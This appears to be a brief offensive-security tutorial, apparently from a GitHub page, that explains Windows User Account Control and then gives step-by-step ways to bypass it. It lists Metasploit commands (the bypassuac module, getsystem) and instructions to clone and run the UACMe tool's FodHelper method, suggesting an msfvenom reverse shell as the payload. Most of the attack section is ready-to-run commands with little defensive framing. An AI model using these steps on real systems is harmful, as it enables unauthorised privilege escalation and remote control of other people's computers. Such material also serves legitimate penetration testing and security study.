## 💡 What is UAC in Windows?

**UAC (User Account Control)** is a safety feature in Windows.

It **asks for permission** when a program tries to make big changes, like installing something or changing system settings.

👉 Example: When a pop-up asks **“Do you want to allow this app to make changes?”**, that’s UAC. as shown in image

<img width="1541" height="791" alt="image" src="https://github.com/user-attachments/assets/1ee0383d-1493-4c80-b0c5-0ce8a4ab122b" />

## **How To Bypass UAC:**

## 1. **Metasploit Framework**

Once you’ve gained access to a Windows system using Metasploit (a Meterpreter session), you can try bypassing UAC to gain admin-level access.

```bash
use exploit/windows/local/bypassuac
set SESSION 1
run
```

run to Attempts to escalate to **SYSTEM**.

```bash
getsystem
```

check privilage

```bash
whoami /priv
```

---

## **2. UACMe (Easy Tool for Bypass)**

**UACMe** is a tool that exploits various UAC bypass techniques.

**Steps to Bypass UAC with UACMe:**

1. **Download UACMe** from GitHub:
    
    ```bash
    git clone https://github.com/hfiref0x/UACME
    ```
    
2. **Compile** or use pre-built binaries.
3. **Choose an exploit method** (e.g., `Method 23` – FodHelper bypass).
4. **Execute the exploit** from a low-privilege cmd:
    1. `akagi32.exe`  is the exploit
    2. `23` is the method of exploit you can try different 
    3. `c:\windows\system32\cmd.exe`  you can use msfvenom reverse shell or cmd for accessing it 
    
    ```bash
    akagi32.exe 23 c:\windows\system32\cmd.exe
    ```
    

---

## 🧠 **Note:**

- This works only if the current user is in the **Administrators group**.
- It will not work if UAC is set to "Always notify."
    
<img width="934" height="697" alt="image" src="https://github.com/user-attachments/assets/726645a9-8b16-437c-b791-e38b342e3ffa" />
  

---
